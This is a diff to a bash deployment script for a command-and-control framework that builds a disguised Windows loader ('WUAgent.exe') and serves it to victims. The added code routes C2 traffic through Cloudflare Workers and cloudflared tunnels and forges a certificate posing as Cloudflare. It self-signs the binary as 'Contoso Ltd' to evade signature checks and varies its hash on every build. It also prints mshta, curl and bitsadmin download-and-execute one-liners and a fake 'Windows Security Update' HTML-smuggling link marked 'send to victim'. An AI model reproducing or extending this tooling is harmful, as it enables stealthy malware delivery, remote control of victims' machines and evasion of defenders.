@@ -27,11 +27,13 @@ set -e
 # ── Config ──────────────────────────────────────────────────────────
 ROOT="$(cd "$(dirname "$0")" && pwd)"
 SERVE_PORT="${SERVE_PORT:-8080}"
-C2_PORT="${C2_PORT:-4443}"
+C2_PORT="${C2_PORT:-443}"
 BUILD_LINUX=false
 BUILD_WINDOWS=false
 INTERACTIVE=true
 LHOST=""
+RELAY_DOMAIN=""
+TUNNEL_MODE=false
 
 # ── Parse args ──────────────────────────────────────────────────────
 while [[ $# -gt 0 ]]; do
@@ -42,6 +44,8 @@ while [[ $# -gt 0 ]]; do
         --port)     SERVE_PORT="$2"; shift ;;
         --c2port)   C2_PORT="$2"; shift ;;
         --lhost)    LHOST="$2"; shift ;;
+        --relay)    RELAY_DOMAIN="$2"; shift ;;
+        --tunnel)   TUNNEL_MODE=true; if [[ -n "$2" && "$2" != --* ]]; then RELAY_DOMAIN="$2"; shift; fi ;;
         *)          echo "[!] Unknown arg: $1"; exit 1 ;;
     esac
     shift
@@ -94,12 +98,16 @@ if $INTERACTIVE; then
     echo -e "  ${W}[1]${N} Deploy Linux loader"
     echo -e "  ${W}[2]${N} Deploy Windows loader"
     echo -e "  ${W}[3]${N} Deploy both"
+    echo -e "  ${W}[4]${N} Deploy Windows + CDN relay ${D}(Cloudflare Worker)${N}"
+    echo -e "  ${W}[5]${N} Deploy Windows + Cloudflared tunnel ${D}(FREE, auto URL)${N}"
     echo ""
-    read -rp "  Select [1-3]: " choice
+    read -rp "  Select [1-5]: " choice
     case "$choice" in
         1) BUILD_LINUX=true ;;
         2) BUILD_WINDOWS=true ;;
         3) BUILD_LINUX=true; BUILD_WINDOWS=true ;;
+        4) BUILD_WINDOWS=true; RELAY_DOMAIN="auto" ;;
+        5) BUILD_WINDOWS=true; TUNNEL_MODE=true ;;
         *) echo "[!] Invalid choice"; exit 1 ;;
     esac
     echo ""
@@ -117,9 +125,11 @@ generate_certs() {
         return
     fi
     echo -e "  ${Y}[*]${N} Generating TLS certificates..."
-    openssl req -x509 -newkey rsa:2048 \
+    openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
         -keyout "$dir/key.pem" -out "$dir/cert.pem" \
-        -days 365 -nodes -subj "/CN=$ATTACKER_IP" 2>/dev/null
+        -days 730 -nodes \
+        -subj '/C=US/ST=California/O=Cloudflare Inc/CN=cdn-wss.cloudflare.com' \
+        -addext 'subjectAltName=DNS:cdn-wss.cloudflare.com,DNS:*.cloudflare.com' 2>/dev/null
     echo -e "  ${G}[+]${N} TLS certs generated: $dir/cert.pem"
 }
 
@@ -145,6 +155,15 @@ patch_c2_windows() {
     sed -i "s|const ENC_C2_PORT: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_C2_PORT: [u8; ${#C2_PORT}] = xor_encode(b\"$C2_PORT\");|" "$src"
 
     echo -e "  ${G}[+]${N} Patched ERS-W C2: ${ATTACKER_IP}:${C2_PORT}"
+
+    if [ -n "$RELAY_DOMAIN" ]; then
+        local relay_host="$RELAY_DOMAIN"
+        local relay_len=${#relay_host}
+        sed -i "s|const ENC_C2_HOST: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_C2_HOST: [u8; $relay_len] = xor_encode(b\"$relay_host\");|" "$src"
+        sed -i "s|const ENC_C2_PORT: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_C2_PORT: [u8; 3] = xor_encode(b\"443\");|" "$src"
+        sed -i "s|const ENC_SNI_DOMAIN: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_SNI_DOMAIN: [u8; $relay_len] = xor_encode(b\"$relay_host\");|" "$src"
+        echo -e "  ${G}[+]${N} Relay mode: ${relay_host} (SNI = real domain, cert = real CF cert)"
+    fi
 }
 
 patch_c2_linux() {
@@ -171,6 +190,68 @@ patch_c2_linux() {
     else
         echo -e "  ${Y}[*]${N} ERS is in proxy/Tor mode (mode $proxy_mode) — IP not patched"
     fi
+}
+
+# ── Deploy CDN relay (Cloudflare Worker) ───────────────────────────
+deploy_relay() {
+    local relay_dir="$ROOT/relay"
+
+    if [ ! -d "$relay_dir" ]; then
+        echo -e "  ${R}[-]${N} relay/ directory not found"
+        return 1
+    fi
+
+    echo -e "${W}══════════════════════════════════════════${N}"
+    echo -e "${G}  Deploying CDN Relay (Cloudflare Worker)${N}"
+    echo -e "${W}══════════════════════════════════════════${N}"
+
+    cd "$relay_dir"
+
+    # Install wrangler if needed
+    if ! command -v wrangler &>/dev/null; then
+        echo -e "  ${Y}[*]${N} Installing wrangler..."
+        npm install --silent 2>/dev/null || true
+    fi
+
+    # Check auth
+    if ! npx wrangler whoami &>/dev/null 2>&1; then
+        echo -e "  ${Y}[!]${N} Not logged into Cloudflare. Logging in..."
+        npx wrangler login || { echo -e "  ${R}[-]${N} Login failed"; cd "$ROOT"; return 1; }
+    fi
+
+    # Patch worker with auth token (generate random one each deploy)
+    local auth_token
+    auth_token=$(head -c 24 /dev/urandom | base64 | tr -d '/+=' | head -c 20)
+    sed -i "s|const AUTH_TOKEN = \"[^\"]*\";|const AUTH_TOKEN = \"${auth_token}\";|" src/worker.js
+    echo -e "  ${G}[+]${N} Generated relay auth token"
+
+    # Deploy (don't let set -e kill the script)
+    echo -e "  ${Y}[*]${N} Deploying worker..."
+    local deploy_output
+    deploy_output=$(npx wrangler deploy 2>&1) || true
+    echo "$deploy_output"
+
+    # Extract worker URL from deploy output
+    local worker_url
+    worker_url=$(echo "$deploy_output" | grep -oP 'https://[a-zA-Z0-9._-]+\.workers\.dev' | head -1)
+
+    if [ -z "$worker_url" ]; then
+        echo -e "  ${R}[-]${N} Could not detect worker URL from deploy output"
+        echo -e "  ${Y}[!]${N} Check output above and set manually: --relay YOUR.workers.dev"
+        cd "$ROOT"
+        return 1
+    fi
+
+    # Strip https://
+    RELAY_DOMAIN=$(echo "$worker_url" | sed 's|https://||')
+    echo -e "  ${G}[+]${N} Worker deployed: ${G}${RELAY_DOMAIN}${N}"
+
+    # Patch listener_relay.py with correct URL and token
+    sed -i "s|WORKER_URL = \"[^\"]*\"|WORKER_URL = \"wss://${RELAY_DOMAIN}/?r=l\"|" "$relay_dir/listener_relay.py"
+    sed -i "s|AUTH_TOKEN = \"[^\"]*\"|AUTH_TOKEN = \"${auth_token}\"|" "$relay_dir/listener_relay.py"
+    echo -e "  ${G}[+]${N} Patched listener_relay.py with URL + auth token"
+
+    cd "$ROOT"
 }
 
 # ── Build Linux ─────────────────────────────────────────────────────
@@ -311,6 +392,23 @@ for old, new in [(b'/rustc/',b'\x00'*7),(b'/home/',b'\x00'*6),(b'.cargo/registry
 open('$STAGE_DIR/WUAgent.exe','wb').write(data)
 " 2>/dev/null
 
+    # Self-sign binary (basic signature — passes "is signed?" checks)
+    if command -v osslsigncode &>/dev/null; then
+        CS_KEY=$(mktemp); CS_CERT=$(mktemp); CS_PFX=$(mktemp)
+        openssl req -x509 -newkey rsa:2048 -keyout "$CS_KEY" -out "$CS_CERT" \
+            -days 365 -nodes -subj '/CN=Contoso Ltd/O=Contoso Ltd' 2>/dev/null
+        openssl pkcs12 -export -in "$CS_CERT" -inkey "$CS_KEY" -out "$CS_PFX" -passout pass: 2>/dev/null
+        osslsigncode sign -pkcs12 "$CS_PFX" -pass "" -n "System Service" \
+            -in "$STAGE_DIR/WUAgent.exe" -out "$STAGE_DIR/WUAgent_s.exe" 2>/dev/null
+        if [ -f "$STAGE_DIR/WUAgent_s.exe" ]; then
+            mv "$STAGE_DIR/WUAgent_s.exe" "$STAGE_DIR/WUAgent.exe"
+            echo -e "  ${G}[+]${N} Binary signed (self-signed)"
+        fi
+        rm -f "$CS_KEY" "$CS_CERT" "$CS_PFX"
+    else
+        echo -e "  ${Y}[!]${N} osslsigncode not found — skipping signing (apt install osslsigncode)"
+    fi
+
     # Append random bytes to PE overlay (unique hash per build, doesn't affect execution)
     dd if=/dev/urandom bs=1 count=$((RANDOM % 512 + 256)) >> "$STAGE_DIR/WUAgent.exe" 2>/dev/null
     echo -e "  ${G}[+]${N} Windows loader ready: $(du -h "$STAGE_DIR/WUAgent.exe" | cut -f1) (unique hash)"
@@ -342,38 +440,54 @@ print_oneliners() {
     fi
 
     if [ -f "$STAGE_DIR/WUAgent.exe" ]; then
+        local DELIVERY_BASE="http://${ATTACKER_IP}:${SERVE_PORT}"
+        if [ -n "$DELIVERY_DOMAIN" ]; then
+            DELIVERY_BASE="https://${DELIVERY_DOMAIN}"
+        fi
+
         echo ""
         echo -e "  ${G}── Windows ────────────────────────────────────${N}"
         echo ""
         echo -e "  ${W}Browser open (stealthiest — no download tool flagged):${N}"
-        echo -e "  ${Y}start http://${ATTACKER_IP}:${SERVE_PORT}/update.html${N}"
+        echo -e "  ${Y}start ${DELIVERY_BASE}/update.html${N}"
         echo -e "  ${D}  Opens default browser → HTML smuggling assembles exe client-side${N}"
         echo ""
         echo -e "  ${W}mshta (Windows-native, no curl/certutil/AMSI):${N}"
-        echo -e "  ${Y}mshta http://${ATTACKER_IP}:${SERVE_PORT}/update.html${N}"
+        echo -e "  ${Y}mshta ${DELIVERY_BASE}/update.html${N}"
         echo -e "  ${D}  Uses built-in mshta.exe to render page + trigger download${N}"
         echo ""
         echo -e "  ${W}CMD + curl (fallback):${N}"
-        echo -e "  ${Y}cmd /c curl -s -o %TEMP%\\WUAgent.exe http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe && start /b %TEMP%\\WUAgent.exe${N}"
+        echo -e "  ${Y}cmd /c curl -s -o %%TEMP%%\\WUAgent.exe ${DELIVERY_BASE}/WUAgent.exe && start /b %%TEMP%%\\WUAgent.exe${N}"
         echo ""
         echo -e "  ${W}CMD + bitsadmin (BITS service — looks like Windows Update):${N}"
-        echo -e "  ${Y}bitsadmin /transfer WUUpdate /download /priority high http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe %TEMP%\\WUAgent.exe && start /b %TEMP%\\WUAgent.exe${N}"
+        echo -e "  ${Y}bitsadmin /transfer WUUpdate /download /priority high ${DELIVERY_BASE}/WUAgent.exe %%TEMP%%\\WUAgent.exe && start /b %%TEMP%%\\WUAgent.exe${N}"
         echo ""
 
         if [ -f "$STAGE_DIR/update.html" ]; then
             echo -e "  ${G}── HTML Smuggling link (send to victim) ───────${N}"
             echo ""
-            echo -e "  ${Y}http://${ATTACKER_IP}:${SERVE_PORT}/update.html${N}"
+            echo -e "  ${Y}${DELIVERY_BASE}/update.html${N}"
             echo ""
             echo -e "  ${D}Victim sees: 'Windows Security Update KB5034441' page${N}"
             echo -e "  ${D}Exe auto-downloads via JS blob → no network file transfer to flag${N}"
+            if [ -n "$DELIVERY_DOMAIN" ]; then
+                echo -e "  ${D}Delivery via Cloudflare HTTPS — encrypted, no plain HTTP exposure${N}"
+            fi
             echo ""
         fi
     fi
 
     echo -e "  ${D}─────────────────────────────────────────────────${N}"
-    echo -e "  ${W}HTTP Server:${N} http://${ATTACKER_IP}:${SERVE_PORT}/"
-    echo -e "  ${W}C2 Listener:${N} wss://${ATTACKER_IP}:${C2_PORT}/"
+    if [ -n "$DELIVERY_DOMAIN" ]; then
+        echo -e "  ${W}HTTP Server:${N} https://${DELIVERY_DOMAIN}/ ${D}(tunneled)${N}"
+    else
+        echo -e "  ${W}HTTP Server:${N} http://${ATTACKER_IP}:${SERVE_PORT}/"
+    fi
+    if [ -n "$RELAY_DOMAIN" ]; then
+        echo -e "  ${W}C2 Listener:${N} wss://${RELAY_DOMAIN}/ ${D}(tunneled)${N}"
+    else
+        echo -e "  ${W}C2 Listener:${N} wss://${ATTACKER_IP}:${C2_PORT}/"
+    fi
     echo ""
 }
 
@@ -415,6 +529,20 @@ open_in_terminal() {
 
 # ── Start listener in THIS terminal (foreground) ──────────────────
 start_listener_foreground() {
+    # Relay mode (Worker only, NOT tunnel) — use relay listener
+    if [ -n "$RELAY_DOMAIN" ] && [ "$TUNNEL_MODE" != true ] && [ -f "$ROOT/relay/listener_relay.py" ]; then
+        echo -e "${C}══════════════════════════════════════${N}"
+        echo -e "${W}  C2 Relay Listener — ${RELAY_DOMAIN}${N}"
+        echo -e "${C}══════════════════════════════════════${N}"
+        echo -e "  ${D}Traffic: Implant → CF CDN → Worker → WSS → Here${N}"
+        echo ""
+
+        cd "$ROOT/relay"
+        python3 listener_relay.py
+        return
+    fi
+
+    # Direct mode — local WSS listener
     local listener_dir=""
     if $BUILD_WINDOWS || [ -f "$STAGE_DIR/WUAgent.exe" ]; then
         listener_dir="$ROOT/ERS-W"
@@ -427,15 +555,28 @@ start_listener_foreground() {
         return
     fi
 
-    generate_certs "$listener_dir"
+    if [ "$TUNNEL_MODE" = true ]; then
+        local TUNNEL_PORT=8444
+        echo -e "${C}══════════════════════════════════════${N}"
+        echo -e "${W}  C2 Tunnel Listener — ws://0.0.0.0:${TUNNEL_PORT}${N}"
+        echo -e "${W}  Tunnel: ${RELAY_DOMAIN}${N}"
+        echo -e "${C}══════════════════════════════════════${N}"
+        echo -e "  ${D}Traffic: Implant → CF CDN → cloudflared → WS → Here${N}"
+        echo ""
 
-    echo -e "${C}══════════════════════════════════════${N}"
-    echo -e "${W}  C2 Listener — wss://0.0.0.0:${C2_PORT}${N}"
-    echo -e "${C}══════════════════════════════════════${N}"
-    echo ""
+        cd "$listener_dir"
+        python3 listener.py ${TUNNEL_PORT} --notls
+    else
+        generate_certs "$listener_dir"
 
-    cd "$listener_dir"
-    python3 listener.py ${C2_PORT}
+        echo -e "${C}══════════════════════════════════════${N}"
+        echo -e "${W}  C2 Listener — wss://0.0.0.0:${C2_PORT}${N}"
+        echo -e "${C}══════════════════════════════════════${N}"
+        echo ""
+
+        cd "$listener_dir"
+        python3 listener.py ${C2_PORT}
+    fi
 }
 
 # ── Start HTTP server in new terminal ──────────────────────────────
@@ -526,6 +667,11 @@ serve_files() {
 
     echo ""
     echo -e "  ${G}[+]${N} HTTP server running in separate terminal"
+
+    if [ "$TUNNEL_MODE" = true ] && [ -n "$CLOUDFLARED_PID" ]; then
+        echo -e "  ${G}[+]${N} Cloudflared tunnel active → localhost:8444"
+    fi
+
     echo -e "  ${G}[+]${N} Listener starting below in this terminal..."
     echo ""
 
@@ -536,6 +682,14 @@ serve_files() {
 # ── Cleanup on exit ────────────────────────────────────────────────
 cleanup() {
     echo ""
+    if [ -n "$CLOUDFLARED_PID" ]; then
+        kill $CLOUDFLARED_PID 2>/dev/null
+        echo -e "${G}[+]${N} Cloudflared C2 tunnel stopped."
+    fi
+    if [ -n "$CLOUDFLARED_HTTP_PID" ]; then
+        kill $CLOUDFLARED_HTTP_PID 2>/dev/null
+        echo -e "${G}[+]${N} Cloudflared delivery tunnel stopped."
+    fi
     echo -e "${G}[+]${N} Deploy complete. HTTP server in separate terminal, listener exited."
 }
 trap cleanup EXIT
@@ -546,7 +700,77 @@ banner
 echo -e "  ${W}Attacker IP:${N}  ${G}${ATTACKER_IP}${N}"
 echo -e "  ${W}C2 port:${N}      ${G}${C2_PORT}${N}"
 echo -e "  ${W}HTTP port:${N}    ${G}${SERVE_PORT}${N}"
+if [ -n "$RELAY_DOMAIN" ]; then
+    echo -e "  ${W}Relay:${N}        ${G}${RELAY_DOMAIN}${N} ${D}(CDN stealth mode)${N}"
+fi
 echo ""
+
+# Start cloudflared tunnel before build (need domain for patching)
+if [ "$TUNNEL_MODE" = true ] && [ -z "$RELAY_DOMAIN" ]; then
+    TUNNEL_PORT=8444
+    echo -e "  ${Y}[*]${N} Starting cloudflared C2 tunnel..."
+    fuser -k "${TUNNEL_PORT}/tcp" 2>/dev/null || true
+    cloudflared tunnel --url http://localhost:${TUNNEL_PORT} --protocol http2 > /tmp/cloudflared_c2.log 2>&1 &
+    CLOUDFLARED_PID=$!
+
+    # Wait for C2 tunnel URL (max 15 seconds)
+    TUNNEL_URL=""
+    for i in $(seq 1 15); do
+        TUNNEL_URL=$(grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cloudflared_c2.log 2>/dev/null | head -1)
+        if [ -n "$TUNNEL_URL" ]; then break; fi
+        sleep 1
+    done
+
+    if [ -n "$TUNNEL_URL" ]; then
+        RELAY_DOMAIN=$(echo "$TUNNEL_URL" | sed 's|https://||')
+        echo -e "  ${G}[+]${N} C2 tunnel: ${G}${RELAY_DOMAIN}${N}"
+    else
+        echo -e "  ${R}[-]${N} C2 tunnel failed. Falling back to direct mode."
+        kill $CLOUDFLARED_PID 2>/dev/null
+        CLOUDFLARED_PID=""
+        TUNNEL_MODE=false
+    fi
+
+    # Start delivery tunnel (HTTP server)
+    if [ "$TUNNEL_MODE" = true ]; then
+        echo -e "  ${Y}[*]${N} Starting cloudflared delivery tunnel..."
+        cloudflared tunnel --url http://localhost:${SERVE_PORT} --protocol http2 > /tmp/cloudflared_http.log 2>&1 &
+        CLOUDFLARED_HTTP_PID=$!
+
+        DELIVERY_URL=""
+        for i in $(seq 1 15); do
+            DELIVERY_URL=$(grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cloudflared_http.log 2>/dev/null | head -1)
+            if [ -n "$DELIVERY_URL" ]; then break; fi
+            sleep 1
+        done
+
+        if [ -n "$DELIVERY_URL" ]; then
+            DELIVERY_DOMAIN=$(echo "$DELIVERY_URL" | sed 's|https://||')
+            echo -e "  ${G}[+]${N} Delivery tunnel: ${G}${DELIVERY_DOMAIN}${N}"
+        else
+            echo -e "  ${Y}[!]${N} Delivery tunnel failed. Using direct HTTP on port ${SERVE_PORT}."
+            kill $CLOUDFLARED_HTTP_PID 2>/dev/null
+            CLOUDFLARED_HTTP_PID=""
+        fi
+    fi
+fi
+
+# Deploy relay first (so RELAY_DOMAIN is set before patching implant)
+if [ "$RELAY_DOMAIN" = "auto" ]; then
+    deploy_relay
+    if [ -z "$RELAY_DOMAIN" ] || [ "$RELAY_DOMAIN" = "auto" ]; then
+        echo -e "${R}[!]${N} Relay deploy failed. Falling back to direct mode."
+        RELAY_DOMAIN=""
+    else
+        echo -e "  ${G}[+]${N} Relay mode active: ${RELAY_DOMAIN}"
+    fi
+elif [ -n "$RELAY_DOMAIN" ]; then
+    echo -e "  ${G}[+]${N} Using relay: ${RELAY_DOMAIN}"
+    # Patch listener_relay.py if domain provided manually
+    if [ -f "$ROOT/relay/listener_relay.py" ]; then
+        sed -i "s|WORKER_URL = \"[^\"]*\"|WORKER_URL = \"wss://${RELAY_DOMAIN}/?r=l\"|" "$ROOT/relay/listener_relay.py"
+    fi
+fi
 
 $BUILD_LINUX && build_linux
 $BUILD_WINDOWS && build_windows
